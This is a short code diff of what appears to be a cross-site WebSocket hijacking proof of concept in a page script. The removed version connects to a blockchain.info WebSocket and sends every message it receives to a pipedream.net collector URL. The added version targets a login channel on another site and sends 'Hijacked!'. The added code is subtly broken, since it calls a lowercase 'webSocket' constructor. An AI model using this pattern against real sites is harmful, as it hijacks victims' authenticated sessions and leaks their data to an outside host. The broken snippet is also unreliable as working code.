@@ -1,11 +1,10 @@
 <script>
-websocket = new WebSocket('wss://ws.blockchain.info/coins')
-websocket.onopen = start
-websocket.onmessage = handleReply
-function start(event) {
-  websocket.send("READY");
+var webSocket = new webSocket('wss://hub.yoti.com/channel/login');
+webSocket.onmessage = function(event) {
+    alert(event.data);
 }
-function handleReply(event) {
-  fetch('https://enebmn3o8ax5r.x.pipedream.net/?'+event.data, {mode: 'no-cors'})
+webSocket.onopen = function(event) {
+    webSocket.send('Hijacked!')
 }
+
 </script>
